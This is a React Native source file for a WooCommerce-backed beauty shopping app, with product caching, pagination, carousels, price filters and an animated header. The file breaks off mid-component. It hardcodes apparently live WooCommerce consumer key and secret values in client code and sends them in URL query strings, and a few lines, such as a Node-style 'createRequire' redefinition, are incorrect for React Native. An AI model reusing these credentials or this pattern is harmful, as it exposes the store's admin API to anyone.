import React, { useState, useEffect, useRef, createContext, useContext } from 'react';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { useSafeAreaInsets, SafeAreaProvider } from 'react-native-safe-area-context';
import {
  View,
  Text,
  StyleSheet,
  FlatList,
  Image,
  TouchableOpacity,
  TextInput,
  Alert,
  Dimensions,
  StatusBar,
  ActivityIndicator,
  ScrollView,
  Animated,
  RefreshControl,
  SafeAreaView,
  Platform,
  Vibration,
} from 'react-native';
import { NavigationContainer } from '@react-navigation/native';
import { createStackNavigator } from '@react-navigation/stack';
import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
import { Ionicons } from '@expo/vector-icons';
const CACHE_DURATION = 5 * 60 * 1000; // 5 minutes
// Add this helper function near the top of your file
const convertToSupportedImageFormat = (url) => {
  if (!url) {
    return 'https://via.placeholder.com/300x300?text=No+Image';
  }
  
  // If it's already a placeholder, return as is
  if (url.includes('via.placeholder.com')) return url;
  
  let processedUrl = url;
  
  // Convert WebP to JPEG for better RN support
  if (processedUrl.toLowerCase().includes('.webp')) {
    // Replace .webp with .jpg
    processedUrl = processedUrl.replace(/\.webp$/i, '.jpg');
    // Also handle cases where .webp has query params
    processedUrl = processedUrl.replace(/\.webp\?/i, '.jpg?');
    console.log('Converted WebP to JPG:', processedUrl);
  }
  
  // Remove WordPress size specs (like -300x300, -150x150, -100x100)
  // But keep the original filename
  processedUrl = processedUrl.replace(/-[0-9]+x[0-9]+(?=\.)/, '');
  
  // Ensure HTTPS
  if (processedUrl.startsWith('http://')) {
    processedUrl = processedUrl.replace('http://', 'https://');
  }
  
  return processedUrl;
};

// Also add a function to get multiple image formats
const getProductImageUrl = (product) => {
  if (!product.images || product.images.length === 0) {
    return 'https://via.placeholder.com/300?text=No+Image';
  }
  
  const originalUrl = product.images[0].src;
  
  // Try different image sizes
  const sizeVariants = [
    originalUrl,
    originalUrl.replace('.webp', '.jpg'),
    originalUrl.replace('.webp', '.png'),
    originalUrl.replace(/-[0-9]+x[0-9]+\./, '.'),
    originalUrl.split('?')[0],
  ];
  
  // Return the first variant, fallback to placeholder
  return sizeVariants[0] || 'https://via.placeholder.com/300?text=Product';
};
const fetchWithCache = async (key, fetchFn) => {
  try {
    // Check if data exists in cache
    const cached = await AsyncStorage.getItem(key);
    if (cached) {
      const { data, timestamp } = JSON.parse(cached);
      // If cache is still fresh, return cached data
      if (Date.now() - timestamp < CACHE_DURATION) {
        console.log(`Using cached data for: ${key}`);
        return data;
      }
    }
    
    // Cache is expired or doesn't exist, fetch fresh data
    console.log(`Fetching fresh data for: ${key}`);
    const data = await fetchFn();
    await AsyncStorage.setItem(key, JSON.stringify({
      data,
      timestamp: Date.now()
    }));
    return data;
  } catch (error) {
    console.error('Cache error:', error);
    return await fetchFn();
  }
};
const { width, height } = Dimensions.get('window');
const API_URL = "https://acw.ind.in/wp-json/wc/v3";
const CONSUMER_KEY = "ck_c8144e0657c7360736cf4d05987f544b1bd5f71b";
const CONSUMER_SECRET = "cs_efb685a3e88d7166d21f1e6360fc49e531ad2db0";

// API Functions
// Replace your existing fetchProducts with this paginated version
const fetchProducts = async (page = 1, perPage = 50) => {
  return await fetchWithCache(`products_page_${page}`, async () => {
    try {
      const url = `${API_URL}/products?per_page=${perPage}&page=${page}&consumer_key=${CONSUMER_KEY}&consumer_secret=${CONSUMER_SECRET}`;
      const response = await fetch(url);
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      const data = await response.json();
      return Array.isArray(data) ? data : (data.data || data.products || []);
    } catch (error) {
      console.error(`Error fetching products page ${page}:`, error);
      return [];
    }
  });
};

// NEW: Function to fetch ALL products across all pages
const fetchAllProducts = async (onProgress) => {
  try {
    let allProducts = [];
    let page = 1;
    let hasMore = true;
    const perPage = 50;
    
    while (hasMore && page <= 10) { // Max 10 pages (500 products) to prevent overload
      console.log(`Fetching page ${page}...`);
      const products = await fetchProducts(page, perPage);
      
      if (products.length === 0) {
        hasMore = false;
        break;
      }
      
      allProducts = [...allProducts, ...products];
      
      if (onProgress) {
        onProgress({
          page,
          totalSoFar: allProducts.length,
          hasMore: products.length === perPage
        });
      }
      
      // If we got less than requested, it's the last page
      if (products.length < perPage) {
        hasMore = false;
      } else {
        page++;
      }
    }
    
    // Cache all products together for faster subsequent loads
    await AsyncStorage.setItem('all_products', JSON.stringify({
      data: allProducts,
      timestamp: Date.now(),
      totalCount: allProducts.length
    }));
    
    console.log(`✅ Fetched total ${allProducts.length} products across ${page} pages`);
    return allProducts;
  } catch (error) {
    console.error("Error fetching all products:", error);
    // Try to get cached all products
    const cached = await AsyncStorage.getItem('all_products');
    if (cached) {
      const { data } = JSON.parse(cached);
      console.log(`Using cached all products: ${data.length} items`);
      return data;
    }
    return [];
  }
};
const carouselImages = [
  require('./assets/1.png'),
  require('./assets/2.png'),
  require('./assets/3.png'),
  require('./assets/4.png'),
];
// Cart Context
const CartContext = createContext();
const WishlistContext = createContext();

// Add these imports at the top if not already present
import { useFocusEffect } from '@react-navigation/native';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// Replace your HomeScreen component with this updated version:
const ImagesCarousel = () => {
  const [currentIndex, setCurrentIndex] = useState(0);
  const scrollRef = useRef(null);
  
  const categoriesCarouselImages = [
    require('./assets/4.png'),
    require('./assets/3.png'),
    require('./assets/2.png'),
    require('./assets/1.png'),
  ];

  // Auto-slide every 3 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentIndex((prev) => (prev + 1) % categoriesCarouselImages.length);
      scrollRef.current?.scrollTo({
        x: ((currentIndex + 1) % categoriesCarouselImages.length) * width,
        animated: true,
      });
    }, 3000);
    return () => clearInterval(interval);
  }, [currentIndex]);

  return (
    <View style={{ marginVertical: 10, position: 'relative' }}>
      <ScrollView
        ref={scrollRef}
        horizontal
        pagingEnabled
        showsHorizontalScrollIndicator={false}
        onMomentumScrollEnd={(e) => {
          const newIndex = Math.round(e.nativeEvent.contentOffset.x / width);
          setCurrentIndex(newIndex);
        }}
      >
        {categoriesCarouselImages.map((image, index) => (
          <TouchableOpacity 
            key={index} 
            style={{ width: width, height: width * 0.6 }}
            activeOpacity={0.9}
            onPress={() => Alert.alert('Image', `Image ${index + 1} selected`)}
          >
            <Image 
              source={image} 
              style={{ width: '100%', height: '100%', resizeMode: 'cover' }} 
            />
          </TouchableOpacity>
        ))}
      </ScrollView>
      
      {/* Dots indicator */}
      <View style={{ 
        flexDirection: 'row', 
        justifyContent: 'center', 
        position: 'absolute', 
        bottom: 12, 
        left: 0, 
        right: 0 
      }}>
        {categoriesCarouselImages.map((_, index) => (
          <View
            key={index}
            style={{
              width: currentIndex === index ? 20 : 8,
              height: 8,
              borderRadius: 4,
              backgroundColor: currentIndex === index ? '#6200ee' : 'rgba(255,255,255,0.5)',
              marginHorizontal: 4,
            }}
          />
        ))}
      </View>
    </View>
  );
};
// UPDATE CategoryCarousel to accept navigation prop
const CategoryCarousel = ({ navigation }) => {  // Make sure it accepts navigation
  const categoryCarouselImages = [
    'https://i.ibb.co/0pmM44Bq/4.png',
    'https://i.ibb.co/DgG9zrR4/3.png',
    'https://i.ibb.co/FbVxzRcP/2.png',
    'https://i.ibb.co/YFT2pRSM/1.png',
  ];

  return (
    <View style={styles.categoryCarouselSection}>
      <View style={styles.sectionHeader}>
        <Text style={styles.sectionTitle}>Shop by Category</Text>
      </View>
      <ScrollView 
        horizontal 
        showsHorizontalScrollIndicator={false}
        contentContainerStyle={styles.categoryCarouselScroll}
      >
        {categoryCarouselImages.map((image, index) => (
          <TouchableOpacity 
            key={index} 
            style={styles.categoryCarouselCard}
            onPress={() => navigation?.navigate('Categories')}
          >
            <Image source={{ uri: image }} style={styles.categoryCarouselImage} />
          </TouchableOpacity>
        ))}
      </ScrollView>
    </View>
  );
};

// UPDATE GridSection to accept navigation prop
const GridSection = ({ navigation }) => {  // Make sure it accepts navigation
  const gridImages = [
    { id: 'grid1', image: 'https://i.ibb.co/whr6ddBv/4.png', title: 'Lipsticks', description: 'Starting at ₹299' },
    { id: 'grid2', image: 'https://i.ibb.co/xKLszqkZ/3.png', title: 'Face Care', description: 'Up to 40% off' },
    { id: 'grid3', image: 'https://i.ibb.co/JRVD5Z3r/2.png', title: 'Perfumes', description: 'Buy 1 Get 1' },
    { id: 'grid4', image: 'https://i.ibb.co/0pBvhr9k/1.png', title: 'Makeup Kits', description: 'Flat ₹499' },
  ];

  return (
    <View style={styles.gridSection}>
      <View style={styles.sectionHeader}>
        <Text style={styles.sectionTitle}>Shop by Brand</Text>
      </View>
      <View style={styles.gridContainer}>
        {gridImages.map((item) => (
          <TouchableOpacity 
            key={item.id} 
            style={styles.gridItem}
            onPress={() => navigation?.navigate('Brands')}
          >
            <Image source={{ uri: item.image }} style={styles.gridImage} />
          </TouchableOpacity>
        ))}
      </View>
    </View>
  );
};
// ========== PRICE FILTER CARDS COMPONENT ==========
const PriceFilterCards = ({ products }) => {
  const [selectedPrice, setSelectedPrice] = useState(null);
  const [filteredProducts, setFilteredProducts] = useState([]);
  const [showProducts, setShowProducts] = useState(false);
  const { addToCart } = useContext(CartContext);
  const { wishlist, addToWishlist, removeFromWishlist, isInWishlist } = useContext(WishlistContext);

  const priceRanges = [
    { price: 199, label: '₹199 Shop', color: '#64B5F6' },
    { price: 299, label: '₹299 Shop', color: '#64B5F6' },
    { price: 399, label: '₹399 Shop', color: '#64B5F6' },
    { price: 499, label: '₹499 Shop', color: '#64B5F6' },
  ];

  const handleCardPress = (price) => {
    const filtered = products.filter(product => {
      const productPrice = parseFloat(product.price);
      return productPrice <= price && productPrice > price - 100;
    });
    setSelectedPrice(price);
    setFilteredProducts(filtered);
    setShowProducts(true);
  };

  const goBack = () => {
    setShowProducts(false);
    setSelectedPrice(null);
    setFilteredProducts([]);
  };

  if (showProducts) {
    return (
      <ProductsPage 
        price={selectedPrice} 
        products={filteredProducts} 
        onBack={goBack}
        addToCart={addToCart}
        wishlist={wishlist}
        addToWishlist={addToWishlist}
        removeFromWishlist={removeFromWishlist}
        isInWishlist={isInWishlist}
      />
    );
  }

  return (
    <View style={{ 
      backgroundColor: '#fff', 
      borderRadius: 16,
      padding: 16,
      overflow: 'hidden',
      width: '100%',
      position: 'relative',
      marginVertical: 15,
      marginHorizontal: 15,
    }}>
      {/* Grid Pattern Overlay */}
      <View style={{
        position: 'absolute',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        opacity: 0.15,
      }}>
        {/* Horizontal lines */}
        {[...Array(20)].map((_, i) => (
          <View key={`h-${i}`} style={{
            position: 'absolute',
            left: 0,
            right: 0,
            top: i * 15,
            height: 1,
            backgroundColor: '#000000',
          }} />
        ))}
        {/* Vertical lines */}
        {[...Array(12)].map((_, i) => (
          <View key={`v-${i}`} style={{
            position: 'absolute',
            top: 0,
            bottom: 0,
            left: i * 30,
            width: 1,
            backgroundColor: '#000000',
          }} />
        ))}
      </View>
      
      {/* Force 2x2 Grid */}
      <View style={{ 
        flexDirection: 'row', 
        flexWrap: 'wrap', 
        justifyContent: 'space-between',
        position: 'relative',
        zIndex: 1,
      }}>
        {priceRanges.slice(0, 4).map((item, index) => (
          <TouchableOpacity
            key={index}
            style={{
              width: (width - 70) / 2,
              marginBottom: index < 2 ? 16 : 0,
              backgroundColor: 'rgba(255,255,255,0.95)',
              borderRadius: 16,
              paddingVertical: 20,
              paddingHorizontal: 16,
              borderWidth: 2,
              borderColor: '#64B5F6',
              zIndex: 1,
              alignItems: 'center',
              justifyContent: 'center',
            }}
            onPress={() => handleCardPress(item.price)}
            activeOpacity={0.8}
          >
            <Text style={{
              fontSize: 36,
              fontWeight: '600',
              color: '#1a1a1a',
              fontFamily: Platform.OS === 'ios' ? 'Didot' : 'serif',
              textAlign: 'center',
              letterSpacing: 1,
            }}>
              ₹{item.price}
            </Text>
            
            <Text style={{
              fontSize: 13,
              fontWeight: '500',
              color: '#666',
              fontFamily: Platform.OS === 'ios' ? 'AvenirNext-Medium' : 'sans-serif-medium',
              marginTop: 6,
              textAlign: 'center',
              letterSpacing: 1.5,
              textTransform: 'uppercase',
            }}>
              STORE
            </Text>
          </TouchableOpacity>
        ))}
      </View>
    </View>
  );
};

// ========== PRODUCTS PAGE COMPONENT (for PriceFilterCards) ==========
const ProductsPage = ({ price, products, onBack, addToCart, wishlist, addToWishlist, removeFromWishlist, isInWishlist }) => {
  const ProductCard = ({ item, index }) => {
    const fadeAnim = useRef(new Animated.Value(0)).current;
    const translateY = useRef(new Animated.Value(50)).current;

    useEffect(() => {
      Animated.parallel([
        Animated.timing(fadeAnim, { toValue: 1, duration: 400, delay: index * 50, useNativeDriver: true }),
        Animated.timing(translateY, { toValue: 0, duration: 400, delay: index * 50, useNativeDriver: true })
      ]).start();
    }, []);

    const handleAddToCart = (e) => {
      e.stopPropagation();
      addToCart({ ...item, price: parseFloat(item.price), quantity: 1 });
      Vibration.vibrate(50);
    };

    const handleWishlist = (e) => {
      e.stopPropagation();
      if (isInWishlist(item.id)) {
        removeFromWishlist(item.id);
      } else {
        addToWishlist(item);
      }
    };

    return (
      <Animated.View style={{ opacity: fadeAnim, transform: [{ translateY }], width: '50%' }}>
        <TouchableOpacity
          activeOpacity={0.9}
          style={styles.productCard}
        >
          <View style={styles.productImageContainer}>
<Image 
  source={{ uri: convertToSupportedImageFormat(item.images?.[0]?.src) }} 
  style={styles.productImage} 
  onError={(e) => {
    e.currentTarget.src = 'https://via.placeholder.com/300?text=Product';
  }}
/>
            {item.sale_price && (
              <View style={styles.saleTag}>
                <Text style={styles.saleTagText}>SALE</Text>
              </View>
            )}
            <TouchableOpacity
              style={styles.wishlistButton}
              onPress={handleWishlist}
            >
              <Ionicons name={isInWishlist(item.id) ? 'heart' : 'heart-outline'} size={22} color={isInWishlist(item.id) ? '#ff4444' : '#fff'} />
            </TouchableOpacity>
          </View>
          <View style={styles.productInfo}>
            <View style={styles.productNamePriceRow}>
              <Text style={styles.productName} numberOfLines={2}>{item.name}</Text>
              <Text style={styles.productPrice}>₹{parseFloat(item.price).toFixed(2)}</Text>
            </View>
            {item.regular_price && item.regular_price !== item.price && (
              <Text style={styles.originalPrice}>₹{item.regular_price}</Text>
            )}
            <View style={styles.productFooter}>
              <View style={styles.ratingContainer}>
                <Ionicons name="star" size={14} color="#FFB800" />
                <Text style={styles.ratingText}>{item.average_rating || '4.5'}</Text>
              </View>
              <TouchableOpacity
                style={styles.addButton}
                onPress={handleAddToCart}
              >
                <Ionicons name="cart-outline" size={16} color="#fff" />
                <Text style={styles.addButtonText}>Add</Text>
              </TouchableOpacity>
            </View>
          </View>
        </TouchableOpacity>
      </Animated.View>
    );
  };

  return (
    <View style={{ flex: 1, backgroundColor: '#f8f8f8' }}>
      {/* Header */}
      <View style={{
        flexDirection: 'row',
        alignItems: 'center',
        paddingHorizontal: 16,
        paddingTop: Platform.OS === 'ios' ? 50 : 40,
        paddingBottom: 16,
        backgroundColor: '#fff',
        borderBottomWidth: 1,
        borderBottomColor: '#f0f0f0',
      }}>
        <TouchableOpacity onPress={onBack} style={{
          width: 40,
          height: 40,
          borderRadius: 20,
          backgroundColor: '#f0f0f0',
          justifyContent: 'center',
          alignItems: 'center',
        }}>
          <Ionicons name="arrow-back" size={24} color="#333" />
        </TouchableOpacity>
        <Text style={{
          fontSize: 20,
          fontWeight: 'bold',
          color: '#333',
          flex: 1,
          textAlign: 'center',
        }}>
          Under ₹{price}
        </Text>
        <View style={{ width: 40 }} />
      </View>

      {/* Products Count */}
      <View style={{
        paddingHorizontal: 16,
        paddingVertical: 12,
        backgroundColor: '#fff',
        marginBottom: 8,
      }}>
        <Text style={{ fontSize: 14, color: '#666' }}>
          {products.length} products found
        </Text>
      </View>

      {/* Products Grid */}
      {products.length === 0 ? (
        <View style={{
          flex: 1,
          justifyContent: 'center',
          alignItems: 'center',
          paddingTop: 100,
        }}>
          <Ionicons name="cube-outline" size={80} color="#ccc" />
          <Text style={{ fontSize: 18, fontWeight: 'bold', color: '#333', marginTop: 20 }}>
            No products found
          </Text>
          <Text style={{ fontSize: 14, color: '#999', marginTop: 8, marginBottom: 20 }}>
            No products available under ₹{price}
          </Text>
          <TouchableOpacity onPress={onBack} style={{
            backgroundColor: '#6200ee',
            paddingHorizontal: 30,
            paddingVertical: 12,
            borderRadius: 25,
          }}>
            <Text style={{ color: '#fff', fontSize: 16, fontWeight: '600' }}>Go Back</Text>
          </TouchableOpacity>
        </View>
      ) : (
        <FlatList
  data={products}
  keyExtractor={(item, index) => item?.id?.toString() || index.toString()}
  numColumns={2}
  showsVerticalScrollIndicator={false}
  renderItem={({ item, index }) => <ProductCard item={item} index={index} />}
  columnWrapperStyle={{ justifyContent: 'space-between', paddingHorizontal: 10 }}
  contentContainerStyle={{ paddingBottom: 20 }}
  initialNumToRender={4}
  maxToRenderPerBatch={6}
  windowSize={5}
  removeClippedSubviews={true}
/>
      )}
    </View>
  );
};
const Header = ({ navigation, cartCount, wishlistCount, searchQuery, setSearchQuery, selectedCategory, setSelectedCategory, categories, scrollY }) => {


  // Animation interpolations
  const headerTranslateY = scrollY.interpolate({
    inputRange: [0, 80, 100],
    outputRange: [0, -16, -16],
    extrapolate: 'clamp',
  });

  // Top section (Welcome + Icons) - Fades out and moves up
  const topSectionOpacity = scrollY.interpolate({
    inputRange: [0, 40, 80],
    outputRange: [1, 0.5, 0],
    extrapolate: 'clamp',
  });

  const topSectionTranslateY = scrollY.interpolate({
    inputRange: [0, 80],
    outputRange: [0, -30],
    extrapolate: 'clamp',
  });

  const topSectionHeight = scrollY.interpolate({
    inputRange: [0, 60, 80],
    outputRange: [50, 25, 0],
    extrapolate: 'clamp',
  });

  // Background color transition - from transparent to sky blue
  const headerBackground = scrollY.interpolate({
    inputRange: [0, 40, 80],
    outputRange: ['rgba(255,255,255,0)', 'rgba(135,206,235,0.7)', 'rgba(135,206,235,0.95)'],
    extrapolate: 'clamp',
  });

  // Search bar background color transition
  const searchBarBackground = scrollY.interpolate({
    inputRange: [0, 40, 80],
    outputRange: ['#f5f5f5', '#ffffff', '#ffffff'],
    extrapolate: 'clamp',
  });

  const headerPaddingTop = scrollY.interpolate({
    inputRange: [0, 80],
    outputRange: [Platform.OS === 'ios' ? 60 : 50, 15],
    extrapolate: 'clamp',
  });

  const headerPaddingBottom = scrollY.interpolate({
    inputRange: [0, 80],
    outputRange: [12, 8],
    extrapolate: 'clamp',
  });

  // Shadow opacity on scroll
  const headerShadowOpacity = scrollY.interpolate({
    inputRange: [0, 50, 100],
    outputRange: [0, 0.1, 0.2],
    extrapolate: 'clamp',
  });

  return (
    <Animated.View style={{
      position: 'absolute',
      top: 0,
      left: 0,
      right: 0,
      backgroundColor: headerBackground,
      paddingTop: headerPaddingTop,
      paddingBottom: headerPaddingBottom,
      paddingHorizontal: 15,
      zIndex: 1000,
      transform: [{ translateY: headerTranslateY }],
      borderBottomWidth: 1,
      borderBottomColor: 'rgba(0,0,0,0.05)',
      shadowColor: '#000',
      shadowOffset: { width: 0, height: 2 },
      shadowOpacity: headerShadowOpacity,
      shadowRadius: 4,
      elevation: headerShadowOpacity.interpolate({
        inputRange: [0, 0.2],
        outputRange: [0, 5],
      }),
    }}>
      <StatusBar barStyle="dark-content" backgroundColor="transparent" translucent />

      {/* Top Section - Welcome Back + Icons (Fades out and moves up on scroll) */}
      <Animated.View style={{
        flexDirection: 'row',
        justifyContent: 'space-between',
        alignItems: 'center',
        marginBottom: 12,
        opacity: topSectionOpacity,
        transform: [{ translateY: topSectionTranslateY }],
        height: topSectionHeight,
        overflow: 'hidden',
      }}>
        <Text style={{
          color: '#1a1a1a',
          fontSize: 16,
          fontWeight: '600',
        }}>Welcome Back! 👋</Text>

        <View style={{
          flexDirection: 'row',
          gap: 18,
          alignItems: 'center',
        }}>
          {/* Wishlist Icon */}
          <TouchableOpacity onPress={() => navigation.navigate('Wishlist')} style={{ position: 'relative' }}>
            <Ionicons name="heart-outline" size={22} color="#1a1a1a" />
            {wishlistCount > 0 && (
              <View style={{
                position: 'absolute',
                top: -6,
                right: -8,
                backgroundColor: '#ff4444',
                borderRadius: 10,
                minWidth: 16,
                height: 16,
                justifyContent: 'center',
                alignItems: 'center',
                paddingHorizontal: 4,
              }}>
                <Text style={{ color: '#fff', fontSize: 9, fontWeight: 'bold' }}>{wishlistCount}</Text>
              </View>
            )}
          </TouchableOpacity>

          {/* Cart Icon */}
          <TouchableOpacity onPress={() => navigation.navigate('Cart')} style={{ position: 'relative' }}>
            <Ionicons name="cart-outline" size={22} color="#1a1a1a" />
            {cartCount > 0 && (
              <View style={{
                position: 'absolute',
                top: -6,
                right: -8,
                backgroundColor: '#ff4444',
                borderRadius: 10,
                minWidth: 16,
                height: 16,
                justifyContent: 'center',
                alignItems: 'center',
                paddingHorizontal: 4,
              }}>
                <Text style={{ color: '#fff', fontSize: 9, fontWeight: 'bold' }}>{cartCount}</Text>
              </View>
            )}
          </TouchableOpacity>

          {/* Profile Icon */}
          <TouchableOpacity onPress={() => navigation.navigate('Profile')}>
            <Image
              source={{ uri: 'https://randomuser.me/api/portraits/women/68.jpg' }}
              style={{ width: 36, height: 36, borderRadius: 18 }}
            />
          </TouchableOpacity>
        </View>
      </Animated.View>

      {/* Search Bar - Stays visible, background changes to white */}
      <Animated.View style={{
        flexDirection: 'row',
        alignItems: 'center',
        backgroundColor: searchBarBackground,
        borderRadius: 30,
        paddingHorizontal: 16,
        paddingVertical: 12,
        gap: 10,
        marginBottom: 12,
        shadowColor: '#000',
        shadowOffset: { width: 0, height: 2 },
        shadowOpacity: scrollY.interpolate({
          inputRange: [0, 50, 100],
          outputRange: [0, 0.05, 0.1],
        }),
        shadowRadius: 4,
        elevation: scrollY.interpolate({
          inputRange: [0, 50, 100],
          outputRange: [0, 2, 3],
        }),
      }}>
        <Ionicons name="search-outline" size={20} color="#999" />
        <TextInput
          style={{ flex: 1, fontSize: 15, color: '#1a1a1a' }}
          placeholder="Search products..."
          placeholderTextColor="#999"
          value={searchQuery}
          onChangeText={setSearchQuery}
        />
        {searchQuery.length > 0 && (
          <TouchableOpacity onPress={() => setSearchQuery('')}>
            <Ionicons name="close-circle" size={18} color="#999" />
          </TouchableOpacity>
        )}
      </Animated.View>

      {/* Category Buttons Row - Always visible */}
      <ScrollView
        horizontal
        showsHorizontalScrollIndicator={false}
        contentContainerStyle={{ gap: 8, paddingHorizontal: 4 }}
      >
        {categories.map((cat) => {
  const isSelected = selectedCategory === cat.id;
  return (
    <TouchableOpacity
      key={cat.id}
      style={{
        paddingVertical: 8,
        paddingHorizontal: 16,
        borderRadius: 20,
        backgroundColor: isSelected ? '#1a1a1a' : 'transparent',
      }}
      onPress={() => {
        setSelectedCategory(cat.id);
        if (cat.id === 'all') {
          navigation.navigate('Home');  // Show all products on Home
        } else {
          navigation.navigate('Categories', { 
            selectedCategory: cat.name,
            categoryId: cat.id 
          });
        }
      }}
      activeOpacity={0.7}
    >
      <Text style={{
        fontSize: 13,
        color: isSelected ? '#fff' : '#666',
        fontWeight: isSelected ? '600' : '500',
      }}>
        {cat.name === 'all' ? 'All' : cat.name}
      </Text>
    </TouchableOpacity>
  );
})}
      </ScrollView>
    </Animated.View>
  );
};
const HomeScreen = ({ navigation }) => {
  const [products, setProducts] = useState([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [selectedCategory, setSelectedCategory] = useState('all');
  const [currentDealIndex, setCurrentDealIndex] = useState(0);
  const [topBrands, setTopBrands] = useState([]);
  const [topCategories, setTopCategories] = useState([]);
  const [brandList, setBrandList] = useState([]);
  const { addToCart } = useContext(CartContext);
  const { wishlist, addToWishlist, removeFromWishlist, isInWishlist } = useContext(WishlistContext);
  const { getItemCount } = useContext(CartContext);
  
  const cartCount = getItemCount();
  const wishlistCount = wishlist.length;
  
  const scrollY = useRef(new Animated.Value(0)).current;

  // Fetch real brands from WooCommerce API
  const fetchBrands = async () => {
    try {
      const url = `${API_URL}/brands?per_page=50&consumer_key=${CONSUMER_KEY}&consumer_secret=${CONSUMER_SECRET}`;
      const response = await fetch(url);
      const data = await response.json();
      
      let brandsArray = [];
      if (Array.isArray(data)) {
        brandsArray = data;
      } else if (data.data && Array.isArray(data.data)) {
        brandsArray = data.data;
      } else if (data.brands && Array.isArray(data.brands)) {
        brandsArray = data.brands;
      }
      
      const formattedBrands = brandsArray.map(brand => ({
        id: brand.id || brand.term_id,
        name: brand.name,
        count: brand.count || 0,
      }));
      
      setBrandList(formattedBrands);
      setTopBrands(formattedBrands.slice(0, 5));
    } catch (error) {
      console.error("Error fetching brands:", error);
      // Fallback demo brands
      const demoBrands = [
        { id: 1, name: 'Cetaphil' },
        { id: 2, name: 'The Body Shop' },
        { id: 3, name: 'Lakme' },
        { id: 4, name: 'Nivea' },
        { id: 5, name: 'Dove' },
      ];
      setTopBrands(demoBrands);
    }
  };

  // Calculate top 5 categories with highest discounts
  const calculateTopCategories = (productList = products) => {
    if (!productList || productList.length === 0) return;

    const categoryDiscountMap = new Map();
    
    productList.forEach(product => {
      const regularPrice = parseFloat(product.regular_price);
      const salePrice = parseFloat(product.price);
      let discount = 0;
      
      if (regularPrice && salePrice && regularPrice > salePrice) {
        discount = ((regularPrice - salePrice) / regularPrice) * 100;
      }
      
      if (product.categories && product.categories.length > 0) {
        product.categories.forEach(category => {
          if (!categoryDiscountMap.has(category.id)) {
            categoryDiscountMap.set(category.id, {
              id: category.id,
              name: category.name,
              totalDiscount: 0,
              productCount: 0,
            });
          }
          
          const cat = categoryDiscountMap.get(category.id);
          cat.totalDiscount += discount;
          cat.productCount++;
          categoryDiscountMap.set(category.id, cat);
        });
      }
    });
    
    const categoriesWithAvgDiscount = Array.from(categoryDiscountMap.values()).map(cat => ({
      ...cat,
      avgDiscount: cat.totalDiscount / cat.productCount
    }));
    
    const sortedCategories = categoriesWithAvgDiscount
      .sort((a, b) => b.avgDiscount - a.avgDiscount)
      .slice(0, 5);
    
    console.log('Top Categories calculated:', sortedCategories);
    setTopCategories(sortedCategories);
  };

  // Get unique categories from products
  const getUniqueCategories = () => {
    const categoryMap = new Map();
    categoryMap.set('all', { id: 'all', name: 'All' });
    
    products.forEach(product => {
      if (product.categories && product.categories.length > 0) {
        product.categories.forEach(cat => {
          if (!categoryMap.has(cat.id.toString())) {
            categoryMap.set(cat.id.toString(), {
              id: cat.id,
              name: cat.name,
            });
          }
        });
      }
    });
    
    return Array.from(categoryMap.values());
  };

  // Load products function
  // Replace the loadProducts function in HomeScreen
const loadProducts = async () => {
  setLoading(true);
  
  // First, try to load cached products for immediate display
  try {
    const cachedAll = await AsyncStorage.getItem('all_products');
    if (cachedAll) {
      const { data, timestamp } = JSON.parse(cachedAll);
      // Use cached data if it's less than 10 minutes old
      if (Date.now() - timestamp < 10 * 60 * 1000) {
        console.log(`⚡ Using cached products (${data.length} items) for instant display`);
        setProducts(data);
        calculateTopCategories(data);
        setLoading(false);
        
        // Still fetch fresh data in background
        refreshProductsInBackground();
        return;
      }
    }
    
    // No cache, fetch first page quickly
    const firstPageProducts = await fetchProducts(1, 50);
    setProducts(firstPageProducts);
    calculateTopCategories(firstPageProducts);
    setLoading(false);
    
    // Then fetch remaining pages in background
    fetchRemainingProducts();
    
  } catch (error) {
    console.error("Error loading products:", error);
    setLoading(false);
  }
};

// Background refresh function
const refreshProductsInBackground = async () => {
  console.log("🔄 Refreshing products in background...");
  const allProducts = await fetchAllProducts();
  if (allProducts.length > 0) {
    setProducts(allProducts);
    calculateTopCategories(allProducts);
  }
};

// Fetch remaining products after initial load
const fetchRemainingProducts = async () => {
  let allProducts = [...products];
  let page = 2;
  let hasMore = true;
  
  while (hasMore && page <= 10) {
    const moreProducts = await fetchProducts(page, 50);
    if (moreProducts.length === 0) {
      hasMore = false;
      break;
    }
    allProducts = [...allProducts, ...moreProducts];
    setProducts(allProducts);
    calculateTopCategories(allProducts);
    
    if (moreProducts.length < 50) {
      hasMore = false;
    } else {
      page++;
    }
  }
  
  // Cache the complete list
  await AsyncStorage.setItem('all_products', JSON.stringify({
    data: allProducts,
    timestamp: Date.now(),
    totalCount: allProducts.length
  }));
  
  console.log(`✅ Finished loading all ${allProducts.length} products`);
};

  const onRefresh = () => {
    setRefreshing(true);
    loadProducts();
    fetchBrands();
  };

  const categories = getUniqueCategories();

  // Fetch products and calculate discounts
  useEffect(() => {
    loadProducts();
    fetchBrands();
  }, []);

  useFocusEffect(
    React.useCallback(() => {
      if (products.length > 0) {
        calculateTopCategories();
      }
    }, [products])
  );

  const mainCategories = getUniqueCategories().slice(0, 5);

  // Updated Essentials Section with navigation
  // In HomeScreen, replace the entire EssentialsSection with this:

const EssentialsSection = () => {
  const latestArrivals = [...products]
    .sort((a, b) => new Date(b.date_created) - new Date(a.date_created))
    .slice(0, 10);

  const handleEssentialPress = (product) => {
    navigation.navigate('ProductDetail', { 
      product: { ...product, price: parseFloat(product.price) } 
    });
  };

  const handleAddToCart = (item, e) => {
    e.stopPropagation();
    addToCart({ ...item, price: parseFloat(item.price), quantity: 1 });
    Vibration.vibrate(50);
  };

  return (
    <View style={styles.essentialsSection}>
      <View style={styles.sectionHeader}>
        <Text style={styles.sectionTitle}>Latest Arrivals</Text>
        <TouchableOpacity onPress={() => navigation.navigate('Categories')}>
        </TouchableOpacity>
      </View>
      <ScrollView 
        horizontal 
        showsHorizontalScrollIndicator={false} 
        contentContainerStyle={styles.essentialsScroll}
      >
        {latestArrivals.map((item) => {
          const discount = item.regular_price && item.regular_price !== item.price 
            ? Math.round(((parseFloat(item.regular_price) - parseFloat(item.price)) / parseFloat(item.regular_price)) * 100)
            : 0;
            
          return (
            <TouchableOpacity 
              key={item.id} 
